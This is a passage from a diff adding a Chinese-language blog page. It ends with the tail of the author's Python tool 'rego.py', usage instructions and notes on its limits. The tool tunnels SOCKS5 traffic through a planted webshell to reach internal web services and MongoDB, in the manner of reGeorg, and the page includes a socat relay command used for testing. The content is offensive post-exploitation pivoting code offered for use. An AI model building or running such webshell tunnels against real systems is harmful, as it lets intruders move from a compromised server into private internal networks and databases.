+        <span class="c1">#     s.close()</span>
+        <span class="c1">#     exit(0)</span>
+        <span class="c1"># # s.close()</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">pass</span>
+
+<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+<span class="n">s</span><span class="o">.</span><span class="n">setsockopt</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">SOL_SOCKET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SO_REUSEADDR</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span>
+<span class="n">s</span><span class="o">.</span><span class="n">bind</span><span class="p">((</span><span class="s2">&quot;127.0.0.1&quot;</span><span class="p">,</span> <span class="mi">9999</span><span class="p">))</span>
+<span class="n">s</span><span class="o">.</span><span class="n">listen</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
+
+
+<span class="k">while</span> <span class="mi">1</span><span class="p">:</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">sock</span><span class="p">,</span> <span class="n">addr_info</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">accept</span><span class="p">()</span>
+        <span class="k">print</span> <span class="s2">&quot;[Accept Bytes]&quot;</span>
+        <span class="n">flag</span> <span class="o">=</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+        <span class="k">if</span> <span class="n">flag</span> <span class="o">==</span> <span class="s2">&quot;</span><span class="se">\x05</span><span class="s2">&quot;</span><span class="p">:</span>
+            <span class="n">target</span><span class="p">,</span> <span class="n">targetPort</span> <span class="o">=</span> <span class="n">parseSocks5</span><span class="p">(</span><span class="n">sock</span><span class="p">)</span>
+            <span class="n">sendPayload</span><span class="p">(</span><span class="n">sock</span><span class="p">)</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="n">sendPayload</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span><span class="n">flag</span><span class="p">)</span>
+    <span class="k">except</span> <span class="ne">KeyboardInterrupt</span><span class="p">:</span>
+        <span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</pre></div>
+
+
+<p>使用方法: <code>python rego.py &lt;webshell&gt; &lt;webshell's pass&gt;</code> </p>
+<p>这个很烂的单线程代码实现了这样的功能:</p>
+<ol>
+<li>开启一个本地的9999的socks5代理</li>
+<li>使用这个代理可以用curl访问内网web服务</li>
+<li>可以访问这些数据库，mongo可用</li>
+<li>使用了8080作为代理，放在burp里面看流量</li>
+</ol>
+<p>有这样的缺点:</p>
+<ol>
+<li>curl访问web和访问mongo只能选一个(比如开了两个窗口，一个访问http，一个访问mongo)</li>
+<li>速度很慢，取决于实际环境，自己调timeout</li>
+<li>ssh或者mysql不能用，因为没有保持socks连接。</li>
+</ol>
+<p>为什么reGeorg就可以？因为reGeorg用<code>while true</code>循环保持了socks连接，通过写入cookie的数据进行交互。</p>
+<p>测试主要使用了socat转发流量:</p>
+<div class="highlight"><pre><span></span><span class="n">socat</span> <span class="o">-</span><span class="n">x</span> <span class="o">-</span><span class="n">d</span> <span class="o">-</span><span class="n">v</span> <span class="n">tcp</span><span class="o">-</span><span class="k">listen</span><span class="p">:</span><span class="mi">8888</span><span class="p">,</span><span class="n">reuseaddr</span><span class="p">,</span><span class="n">fork</span> <span class="n">tcp</span><span class="p">:</span><span class="mi">127</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">1</span><span class="p">:</span><span class="mi">8889</span>
+</pre></div>
+
+
+<h3>END</h3>
+<p>测试了下redis不可用，因为默认redis使用的是RESP的协议。</p>
+    </div><!-- /.entry-content -->
+
+  </article>
+</section>
+        <section id="extras" class="body">
+        </section><!-- /#extras -->
+
+
+</body>
+</html>
